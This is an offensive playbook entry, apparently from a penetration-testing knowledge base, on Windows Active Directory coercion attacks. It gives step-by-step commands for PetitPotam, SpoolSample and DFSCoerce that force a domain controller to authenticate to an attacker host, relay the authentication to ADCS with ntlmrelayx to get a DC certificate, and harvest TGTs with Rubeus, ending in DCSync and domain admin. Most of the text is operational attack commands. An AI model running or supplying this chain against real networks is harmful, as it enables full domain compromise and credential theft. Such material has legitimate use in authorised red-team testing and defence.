---
id: print-spooler-coercion
title: Print Spooler / Coercion Attacks
stage: initial-access
tags: [windows, ad]
summary: Force a privileged machine (domain controller, exchange server) to authenticate to an attacker-controlled host — feeds directly into NTLM relay or unconstrained delegation TGT harvesting.
leads_to:
  - ntlm-relay
  - kerberos-delegation
---

## Prerequisites

Network access to the target. For SpoolSample/PrinterBug: Print Spooler service running on target (check with `nxc smb TARGET -u user -p pass -M spooler`). For PetitPotam: works unauthenticated on unpatched systems. For DFSCoerce: DFS running on target. These coerce the *machine account* of the target — most valuable when targeting DCs.

Coercion attacks force a Windows machine to initiate an outbound authentication to an IP you control. The machine authenticates as its computer account (e.g., `DC$`). If you relay that authentication to ADCS Web Enrollment (ESC8), you get a certificate for the DC account → Kerberos auth as DC → DCSync. If the DC has unconstrained delegation on another host, the TGT is cached there and can be extracted.

## Quick Win

> PetitPotam — unauthenticated, no prior creds required on unpatched targets.

```bash
python3 PetitPotam.py -u '' -p '' ATTACKER_IP TARGET_DC_IP
# ATTACKER_IP is where you want the auth sent (your relay listener)
```

## SpoolSample / PrinterBug (MS-RPRN)

> Requires valid domain credentials — more reliable than PetitPotam on patched targets.

```bash
# Check if spooler is running
nxc smb $TARGET -u $USER -p $PASS -M spooler

# Coerce auth to your listener
python3 SpoolSample.py $TARGET ATTACKER_IP
# Or: impacket
impacket-dcomexec -object MMC20 $DOMAIN/$USER:$PASS@$TARGET "cmd /c ..."
```

## PetitPotam (MS-EFSRPC)

```bash
# Unauthenticated (unpatched)
python3 PetitPotam.py ATTACKER_IP $DC_IP

# Authenticated
python3 PetitPotam.py -u $USER -p $PASS -d $DOMAIN ATTACKER_IP $DC_IP
```

## DFSCoerce (MS-DFSNM)

```bash
python3 dfscoerce.py -u $USER -p $PASS $DOMAIN ATTACKER_IP $DC_IP
```

## Relay to ADCS (ESC8)

> Run relay listener before triggering coercion — captures DC auth and requests a certificate.

```bash
# Step 1: start relay listener
impacket-ntlmrelayx -t http://$CA_IP/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Step 2: trigger coercion (any of the above)
python3 PetitPotam.py ATTACKER_IP $DC_IP

# Step 3: authenticate as DC using the certificate
certipy auth -pfx dc.pfx -dc-ip $DC_IP
# → returns NT hash of the DC machine account → DCSync
```

## Relay to Unconstrained Delegation Host

> If a machine has unconstrained delegation, coercing DC auth to it harvests the DC's TGT.

```bash
# On the unconstrained delegation machine — monitor for incoming TGTs
.\Rubeus.exe monitor /interval:5 /nowrap

# Trigger coercion targeting the delegation host
python3 PetitPotam.py DELEGATION_HOST_IP $DC_IP

# Use the harvested DC TGT
.\Rubeus.exe ptt /ticket:BASE64_TGT
```

## Leads To

Coerce DC → relay to ADCS → DC certificate → DCSync (via kerberos-delegation or ntlm-relay path). Coerce DC → relay to LDAP → configure RBCD on attacker machine → S4U2Self/S4U2Proxy → DA. DC TGT harvested from unconstrained delegation host → `sekurlsa::tickets` → impersonate DC → DCSync.
